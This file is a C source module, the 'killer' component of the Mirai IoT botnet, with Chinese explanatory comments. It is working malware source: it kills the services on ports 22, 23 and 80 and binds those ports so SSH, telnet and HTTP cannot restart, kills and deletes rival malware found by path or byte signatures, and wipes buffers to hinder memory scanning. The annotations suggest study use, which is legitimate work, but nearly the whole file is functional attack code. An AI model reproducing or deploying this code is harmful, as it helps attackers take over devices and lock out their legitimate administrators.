#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"
//kill模块，此模块主要有两个作用：
//其一是关闭特定的端口并占用
//另一是删除特定文件并kill对应进程，简单来说就是排除异己。
int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)  //kill掉了22、23、80端口原来的进程，并且对这些端口bind占用，listen但是不调用accept。即永远不会再接受连接了【从而排除异己】
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    // Let parent continue on main thread
    killer_pid = fork();    //父进程回到main.c中继续执行，子进程不断kill【每600s，就重新从pid=400开始scan+kill可疑进程】
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    // Kill telnet service and prevent it from restarting
#ifdef KILLER_REBIND_TELNET
#ifdef DEBUG
    printf("[killer] Trying to kill port 23\n");
#endif
    //查找23端口对应的进程并将其kill掉
    if (killer_kill_by_port(htons(23)))
    {
#ifdef DEBUG
        printf("[killer] Killed tcp/23 (telnet)\n");
#endif
    } else {
#ifdef DEBUG
        printf("[killer] Failed to kill port 23\n");
#endif
    }
    //通过bind进行端口占用
    tmp_bind_addr.sin_port = htons(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf("[killer] Bound to tcp/23 (telnet)\n");
#endif
#endif

    // Kill SSH service and prevent it from restarting
#ifdef KILLER_REBIND_SSH
    if (killer_kill_by_port(htons(22)))
    {
#ifdef DEBUG
        printf("[killer] Killed tcp/22 (SSH)\n");
#endif
    }
    tmp_bind_addr.sin_port = htons(22);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf("[killer] Bound to tcp/22 (SSH)\n");
#endif
#endif

    // Kill HTTP service and prevent it from restarting
#ifdef KILLER_REBIND_HTTP
    if (killer_kill_by_port(htons(80)))
    {
#ifdef DEBUG
        printf("[killer] Killed tcp/80 (http)\n");
#endif
    }
    tmp_bind_addr.sin_port = htons(80);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf("[killer] Bound to tcp/80 (http)\n");
#endif
#endif

    // In case the binary is getting deleted, we want to get the REAL realpath
    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;
/*
    程序将通过readdir函数遍历/proc下的进程文件夹来查找特定文件，而readlink函数可以获取进程所对应程序的真实路径，这里会查找与之同类的恶意程序anime，如果找到就删除文件并kill掉进程：
    同时，如果/proc/$pid/exe文件匹配了下述字段，对应进程也要被kill掉：
    REPORT %s:%s
    HTTPFLOOD
    LOLNOGTFO
    \x58\x4D\x4E\x4E\x43\x50\x46\x22
    zollard
*/
    if (!has_exe_access())      //killer_realpath存储了mirai自己的可执行文件位置
    {
#ifdef DEBUG
        printf("[killer] Machine does not have /proc/$pid/exe\n");
#endif
        return;
    }
#ifdef DEBUG
    printf("[killer] Memory scanning processes\n");
#endif

    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);    
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)   // /proc
        {
#ifdef DEBUG
            printf("[killer] Failed to open /proc!\n");
#endif
            break;
        }   
        table_lock_val(TABLE_KILLER_PROC);

        while ((file = readdir(dir)) != NULL)                       
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')     //PID不为数字的跳过
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];        
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);

            scan_counter++;                     
            if (pid <= killer_highest_pid)      //killer_highest_pid初始化为400
            {   //在源码中函数中还有一部分是对 Killer 多进程保护，在KILLER_RESTART_SCAN_TIME(600)超时后会重启所有进程。
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                {
#ifdef DEBUG
                    printf("[killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
#endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1); // Sleep so we can wait for another process to spawn
                }

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_EXE);

            // Store /proc/$pid/exe into exe_path
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

            // Store /proc/$pid/status into status_path
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));  // /proc/pid/status  包含了进程的状态信息

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_EXE);

            // Resolve exe_path (/proc/$pid/exe) -> realpath 【exe是指向进程文件的一个符号链接】
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string

                table_unlock_val(TABLE_KILLER_ANIME);           // ".anime"
                // If path contains ".anime" kill.
                if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1) //  如果realpath中包含了.anime，那么就删除这个进程
                {
                    unlink(realpath);   //unlink的时候，如果这是最后一个链接文件，那么会在没有进程开启其文件描述符的时候，删掉这个文件。
                    kill(pid, 9);
                }
                table_lock_val(TABLE_KILLER_ANIME);

                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))  //如果是和自己相关的模块就跳过。
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)  //如果这个进程的exe链接文件可以打开。【什么情况可以成功打开？貌似是用户态的一些无关紧要的进程】
                {   //exe实际是一个伪文件，和符号链接有一些差异。伪文件由内核创建，并非指向真实文件，而是从内存中直接获取文件内容【https://www.reddit.com/r/linux4noobs/comments/2san89/how_does_the_procpidexe_symlink_work/】
#ifdef DEBUG
                    printf("[killer] Process '%s' has deleted binary!\n", realpath);
#endif
                    kill(pid, 9);       //其他进程都直接kill，不会删除本地文件。
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))    //如果查找的进程所对应的文件内容中存在某些特殊敏感字节。为了排除异己，也要kill掉这些进程
            {
#ifdef DEBUG
                printf("[killer] Memory scan match for binary %s\n", exe_path);
#endif
                kill(pid, 9);
            } 

            /*
            if (upx_scan_match(exe_path, status_path))
            {
#ifdef DEBUG
                printf("[killer] UPX scan match for binary %s\n", exe_path);
#endif
                kill(pid, 9);
            }
            */

            // Don't let others memory scan!!!
            //[走之前不忘删掉自己的犯罪记录]
            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }

#ifdef DEBUG
    printf("[killer] Finished\n");
#endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

//查找特定端口对应的进程并将其kill掉
//  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
//   0: 8996A8C0:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   121        0 27863 1 0000000000000000 100 0 0 10 0 
BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);   //转换为16进制的字符串数字
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';  //0023\0
    }

    table_unlock_val(TABLE_KILLER_PROC);    // /proc
    table_unlock_val(TABLE_KILLER_EXE);     // /exe
    table_unlock_val(TABLE_KILLER_FD);      // /fd

    fd = open("/proc/net/tcp", O_RDONLY);   //记录了所有tcp连接的情况
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)    //读取一行，最多读取一行的512个字节
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;   
        i += 2;
        ii = i; //这时的

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;    //ii~i为local address【ip+port】；eg：8996A8C0:0035。通过赋值\0，截取local addr字符串

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)    //判断占有的本地端口是不是参数指定要kill掉的端口。eg：23 = 0x17
        {   //如果占用了指定的端口
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)    //从local_addr后，index为7的那一列，即inode【空格分割每一列，不是按照title分】
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')  //如果找到空格或\t说明进入了下一列
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;
                    //https://guanjunjian.github.io/2017/11/09/study-8-proc-net-tcp-analysis/
                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A') //0xA的connection state表示TCP_LISTEN
                    {
                        listening_state = TRUE; //说明现在已完成连接
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;   //如果不是连接状态，没必要kill了

            while (buffer[i] != 0 && buffer[i] != ' ')  //找到inode列的值
                i++;
            buffer[i++] = 0;    //截断该列

            if (util_strlen(&(buffer[ii])) > 15)      
                continue;

            util_strcpy(inode, &(buffer[ii]));  //记录inode
            break;
        }
    }
    close(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf("Failed to find inode for port %d\n", ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);

        return 0;
    }

#ifdef DEBUG
    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {   //ptr_path是指向数组path的指针
        while ((entry = readdir(dir)) != NULL && ret == 0)  //遍历/proc目录下的文件【一堆pid文件名】
        {
            char *pid = entry->d_name;      //文件名

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')   //过滤pid为1~9的进程
                continue;
            //ptr_path初始为空。
            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid); 
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));  //拼接得到/proc/$pid/exe

            /*
                readlink()会将参数path的符号链接内容存储到参数buf所指的内存空间，返回的内容不是以\000作字符串结尾，但会将字符串的字符数返回，这使得添加\000变得简单。
                若参数bufsiz小于符号连接的内容长度，过长的内容会被截断，如果 readlink 第一个参数指向一个文件而不是符号链接时，readlink 设置errno 为 EINVAL 并返回 -1。
            */    
            if (readlink(path, exe, PATH_MAX) == -1)   //读取/proc/$pid/exe，得到该进程对应的文件位置【如果可以打开说明，是非特权进程】
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));   //拼接得到/proc/$pid/fd
            if ((fd_dir = opendir(path)) != NULL)   //查看这个进程打开的文件描述符
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)    //遍历/proc/$pid/fd下的子文件
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);   //把exe清空
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)        //找到/proc/$pid/fd/文件描述符连接到哪里
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)   //查找某进程开启的文件描述符是否包含开了指定端口tcp连接的那个inode【socket:[inode]】
                    {
#ifdef DEBUG
                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
#else
                        kill(util_atoi(pid, 10), 9);    //对这个进程的pid发起kill
#endif
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return ret;
}

static BOOL has_exe_access(void)    //获取killer_realpath【mirai自己的可执行文件位置】
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);

    // Copy /proc/$pid/exe into path
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));  //读取本身pid的exe。

    // Try to open file
    if ((fd = open(path, O_RDONLY)) == -1)  //可以打开mirai自己的可执行文件的符号连接文件exe
    {
#ifdef DEBUG
        printf("[killer] Failed to open()\n");
#endif
        return FALSE;
    }
    close(fd);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);

    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)   //找到mirai自己的可执行文件的位置
    {
        killer_realpath[k_rp_len] = 0;  //readlink本身末尾没有\0，需要手动添加
#ifdef DEBUG
        printf("[killer] Detected we are running out of `%s`\n", killer_realpath);
#endif
    }

    util_zero(path, ptr_path - path);

    return TRUE;
}

/*
static BOOL status_upx_check(char *exe_path, char *status_path)
{
    int fd, ret;

    if ((fd = open(exe_path, O_RDONLY)) != -1)
    {
        close(fd);
        return FALSE;
    }

    if ((fd = open(status_path, O_RDONLY)) == -1)
        return FALSE;

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
        {
            found = TRUE;
            break;
        }
    }

    //eyy

    close(fd);
    return FALSE;
}
*/
\

/*
    如果进程对应的文件内容中包含下列字段，也要kill
    REPORT %s:%s
    HTTPFLOOD
    LOLNOGTFO           // 这是IoT Malware Gafgyt 接收C&C服务器的一种指令：LOLNOGTFO: Exit the process ；https://www.fortinet.com/blog/threat-research/linux-gafgyt-b-tr-exploits-netcore-vulnerability
    \x58\x4D\x4E\x4E\x43\x50\x46\x22
    zollard          // 这是另外一种IoT Malware 
*/
static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard;
    int m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len;
    BOOL found = FALSE;

    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_MEM_QBOT);
    table_unlock_val(TABLE_MEM_QBOT2);
    table_unlock_val(TABLE_MEM_QBOT3);
    table_unlock_val(TABLE_MEM_UPX);
    table_unlock_val(TABLE_MEM_ZOLLARD);

    m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &m_qbot_len);
    m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &m_qbot2_len);
    m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &m_qbot3_len);
    m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &m_upx_len);
    m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &m_zollard_len);

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)     //读取4KB大小的文件内容
    {
        if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_MEM_QBOT);
    table_lock_val(TABLE_MEM_QBOT2);
    table_lock_val(TABLE_MEM_QBOT3);
    table_lock_val(TABLE_MEM_UPX);
    table_lock_val(TABLE_MEM_ZOLLARD);

    close(fd);

    return found;   //返回为ture，则要被kill
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}
